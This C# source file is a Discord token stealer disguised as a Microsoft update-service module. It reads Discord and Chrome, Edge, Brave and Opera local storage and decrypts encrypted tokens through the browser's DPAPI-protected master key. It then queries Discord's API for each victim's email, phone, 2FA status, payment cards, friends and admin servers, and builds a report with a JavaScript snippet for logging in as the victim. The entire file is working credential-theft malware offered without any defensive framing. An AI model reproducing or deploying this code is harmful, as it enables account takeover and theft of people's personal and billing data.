using System;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text;
using System.Linq;
using System.Security.Cryptography;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using FinalBot;

namespace Microsoft.UpdateService.Modules
{
    public class ChatService
    {
        private static string D(string s)
        {
            char[] c = s.ToCharArray();
            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
            return new string(c);
        }

        private static void Log(string msg)
        {
            string line = $"[{DateTime.Now:HH:mm:ss}] [DISCORD] {msg}";
            Console.WriteLine(line);
            try { File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), line + "\n"); } catch { }
        }

        private readonly string _appData   = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private readonly string _localData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        // Direct literal regexes — no obfuscation needed at this stage
        private static readonly string TOKEN_PLAIN = @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}";
        private static readonly string TOKEN_MFA   = @"mfa\.[\w-]{84}";
        private static readonly string TOKEN_ENC   = @"dQw4w9WgXcQ:[^\s""]{60,160}";

        public async Task<string> Run()
        {
            var tokens = new HashSet<string>();

            var paths = new Dictionary<string, string>
            {
                {"Discord",       Path.Combine(_appData,   "discord")},
                {"Discord Canary",Path.Combine(_appData,   "discordcanary")},
                {"Discord PTB",   Path.Combine(_appData,   "discordptb")},
                {"Chrome",        Path.Combine(_localData, "Google", "Chrome", "User Data", "Default")},
                {"Edge",          Path.Combine(_localData, "Microsoft", "Edge", "User Data", "Default")},
                {"Brave",         Path.Combine(_localData, "BraveSoftware", "Brave-Browser", "User Data", "Default")},
                {"Opera",         Path.Combine(_appData,   "Opera Software", "Opera Stable")},
                {"Opera GX",      Path.Combine(_appData,   "Opera Software", "Opera GX Stable")},
            };

            Log($"Starting scan. Checking {paths.Count} paths...");

            foreach (var kv in paths)
            {
                bool exists = Directory.Exists(kv.Value);
                Log($"  [{kv.Key}] exists={exists} -> {kv.Value}");
                if (!exists) continue;

                try
                {
                    var found = await ScanPath(kv.Key, kv.Value);
                    Log($"  [{kv.Key}] found {found.Count} token(s)");
                    foreach (var t in found) tokens.Add(t);
                }
                catch (Exception ex)
                {
                    Log($"  [{kv.Key}] EXCEPTION: {ex.Message}");
                }
            }

            Log($"Total unique tokens found: {tokens.Count}");

            if (tokens.Count == 0) return "❌ No Discord tokens found.";

            var report = new StringBuilder();
            report.AppendLine("💎 ✨ <b>DISCORD ANALYSIS REPORT</b> ✨ 💎");
            report.AppendLine($"🔍 Found <b>{tokens.Count}</b> token(s)");
            report.AppendLine("");

            using (var client = new HttpClient())
            {
                client.Timeout = TimeSpan.FromSeconds(10);

                foreach (var token in tokens)
                {
                    report.AppendLine($"📡 <code>{token}</code>");

                    // Quick Login JS snippet
                    string quickLogin = "<code>" +
                        WebUtility.HtmlEncode("(function(t){try{window.webpackChunkdiscord_app.push([[Symbol()],{},e=>{for(let r of Object.values(e.c)){if(r.exports?.default?.updateToken){r.exports.default.updateToken(t);break;}}}])}catch(e){}try{localStorage.setItem('token','\"'+t+'\"');}catch(e){}setTimeout(()=>location.reload(),500);})('" + token + "')") +
                        "</code>";
                    report.AppendLine("💠 <b>Quick Login:</b>\n" + quickLogin);

                    var info = await GetAccountInfo(client, token);
                    if (info != null)
                    {
                        string user  = WebUtility.HtmlEncode(info["username"]?.ToString() ?? "Unknown");
                        string email = WebUtility.HtmlEncode(info["email"]?.ToString() ?? "N/A");
                        string phone = WebUtility.HtmlEncode(info["phone"]?.ToString() ?? "N/A");

                        report.AppendLine($"\n👤 <b>User:</b> <code>{user}</code>");
                        report.AppendLine($"🆔 <b>ID:</b> <code>{info["id"]}</code>");
                        report.AppendLine($"📧 <b>Email:</b> <code>{email}</code>");
                        report.AppendLine($"📱 <b>Phone:</b> <code>{phone}</code>");
                        report.AppendLine($"🛡 <b>2FA:</b> {(info["mfa_enabled"]?.ToString() == "True" ? "🟢 On" : "🔴 Off")}");

                        string nitro = (int)(info["premium_type"] ?? 0) switch
                        {
                            1 => "💙 Nitro Classic",
                            2 => "💜 Nitro (Boost)",
                            3 => "💛 Nitro Basic",
                            _ => "⬛ None"
                        };
                        report.AppendLine($"💎 <b>Nitro:</b> {nitro}");
                        report.AppendLine($"👥 <b>Friends:</b> <code>{info["friends_count"]}</code>");

                        if (info["billing_info"] is JArray cards && cards.Count > 0)
                        {
                            report.AppendLine($"\n💳 <b>Billing ({cards.Count}):</b>");
                            foreach (var card in cards)
                            {
                                string type  = card["type"]?.ToString() == "1" ? "💳" : "🅿️";
                                string brand = card["brand"]?.ToString() ?? "";
                                string last4 = card["last_4"]?.ToString() ?? "****";
                                report.AppendLine($"   {type} {brand} *{last4}");
                            }
                        }
                        else report.AppendLine("💳 <b>Billing:</b> ❌ None");

                        if (info["admin_guilds"] is JArray guilds && guilds.Count > 0)
                        {
                            report.AppendLine($"🏰 <b>Admin servers ({guilds.Count}):</b>");
                            foreach (var g in guilds.Take(5))
                                report.AppendLine($"   • {WebUtility.HtmlEncode(g["name"]?.ToString() ?? "?")}");
                        }
                    }
                    else
                    {
                        report.AppendLine("⚠️ <b>Invalid / Expired token</b>");
                    }
                    report.AppendLine("——————————————————————————————");
                }
            }
            return report.ToString();
        }

        private async Task<JObject?> GetAccountInfo(HttpClient client, string token)
        {
            try
            {
                string apiBase = "https://discord.com/api/v9";
                client.DefaultRequestHeaders.Clear();
                client.DefaultRequestHeaders.TryAddWithoutValidation("Authorization", token);
                client.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36");

                var resp = await client.GetAsync($"{apiBase}/users/@me");
                if (!resp.IsSuccessStatusCode) { Log($"API /users/@me returned {resp.StatusCode}"); return null; }

                var user = JObject.Parse(await resp.Content.ReadAsStringAsync());

                // Billing
                var bResp = await client.GetAsync($"{apiBase}/users/@me/billing/payment-sources");
                if (bResp.IsSuccessStatusCode)
                    user["billing_info"] = JArray.Parse(await bResp.Content.ReadAsStringAsync());

                // Friends
                var fResp = await client.GetAsync($"{apiBase}/users/@me/relationships");
                if (fResp.IsSuccessStatusCode)
                    user["friends_count"] = JArray.Parse(await fResp.Content.ReadAsStringAsync()).Count;

                // Admin guilds
                var gResp = await client.GetAsync($"{apiBase}/users/@me/guilds");
                if (gResp.IsSuccessStatusCode)
                {
                    var guilds = JArray.Parse(await gResp.Content.ReadAsStringAsync());
                    var adminGuilds = new JArray(guilds.Where(g => (long.Parse(g["permissions"]?.ToString() ?? "0") & 0x8) == 0x8));
                    user["admin_guilds"] = adminGuilds;
                }

                return user;
            }
            catch (Exception ex) { Log($"GetAccountInfo error: {ex.Message}"); return null; }
        }

        private async Task<List<string>> ScanPath(string service, string rootPath)
        {
            var results = new List<string>();

            // Discord: Local Storage/leveldb. Browsers: same subdirectory or root leveldb.
            var ldbDirs = new List<string>();

            string lsLdb = Path.Combine(rootPath, "Local Storage", "leveldb");
            if (Directory.Exists(lsLdb)) ldbDirs.Add(lsLdb);

            string directLdb = Path.Combine(rootPath, "leveldb");
            if (Directory.Exists(directLdb)) ldbDirs.Add(directLdb);

            if (ldbDirs.Count == 0)
            {
                Log($"  [{service}] No leveldb dirs found.");
                return results;
            }

            // Try to get master key for AES-GCM decryption
            byte[]? masterKey = GetMasterKey(rootPath);
            Log($"  [{service}] masterKey={(masterKey != null ? $"{masterKey.Length}b" : "null")}, dirs={ldbDirs.Count}");

            foreach (var dir in ldbDirs)
            {
                var files = Directory.GetFiles(dir, "*.ldb")
                    .Concat(Directory.GetFiles(dir, "*.log")).ToArray();

                foreach (var file in files)
                {
                    try
                    {
                        using var fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                        using var sr = new StreamReader(fs, Encoding.GetEncoding(28591)); // latin-1 for binary safe
                        string content = await sr.ReadToEndAsync();

                        // Plain tokens
                        foreach (Match m in Regex.Matches(content, TOKEN_PLAIN))
                            if (!results.Contains(m.Value)) results.Add(m.Value);

                        foreach (Match m in Regex.Matches(content, TOKEN_MFA))
                            if (!results.Contains(m.Value)) results.Add(m.Value);

                        // Encrypted tokens
                        foreach (Match m in Regex.Matches(content, TOKEN_ENC))
                        {
                            string raw = m.Value;
                            int colonIdx = raw.IndexOf(':');
                            if (colonIdx < 0) continue;
                            string encPart = raw.Substring(colonIdx + 1).TrimEnd('"', ' ', '\r', '\n');

                            if (masterKey != null)
                            {
                                string? dec = TryDecrypt(encPart, masterKey);
                                if (!string.IsNullOrEmpty(dec) && !results.Contains(dec))
                                {
                                    Log($"  [{service}] Decrypted: {dec.Substring(0, Math.Min(12, dec.Length))}...");
                                    results.Add(dec);
                                }
                            }
                        }
                    }
                    catch { }
                }
            }

            return results.Distinct().ToList();
        }

        private byte[]? GetMasterKey(string rootPath)
        {
            // Check both in rootPath and parent (for browser profiles)
            string[] candidates = {
                Path.Combine(rootPath, "Local State"),
                Path.Combine(Path.GetDirectoryName(rootPath) ?? rootPath, "Local State")
            };

            foreach (string stateFile in candidates)
            {
                if (!File.Exists(stateFile)) continue;
                try
                {
                    var json = JObject.Parse(File.ReadAllText(stateFile));
                    string? b64Key = json["os_crypt"]?["encrypted_key"]?.ToString();
                    if (string.IsNullOrEmpty(b64Key)) continue;

                    byte[] keyWithPrefix = Convert.FromBase64String(b64Key);
                    if (keyWithPrefix.Length < 5) continue;

                    byte[] key = keyWithPrefix.Skip(5).ToArray(); // strip 'DPAPI'
                    return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
                }
                catch { }
            }
            return null;
        }

        private string? TryDecrypt(string encryptedBase64, byte[] key)
        {
            try
            {
                byte[] data = Convert.FromBase64String(encryptedBase64);
                // Format: v10 prefix (3 bytes) + IV (12 bytes) + ciphertext + tag (16 bytes)
                if (data.Length < 3 + 12 + 16) return null;

                byte[] iv         = data.Skip(3).Take(12).ToArray();
                byte[] payload    = data.Skip(15).ToArray();
                byte[] tag        = payload.TakeLast(16).ToArray();
                byte[] ciphertext = payload.SkipLast(16).ToArray();
                byte[] plaintext  = new byte[ciphertext.Length];

                using var aes = new AesGcm(key, 16);
                aes.Decrypt(iv, ciphertext, tag, plaintext);
                return Encoding.UTF8.GetString(plaintext);
            }
            catch { return null; }
        }
    }
}
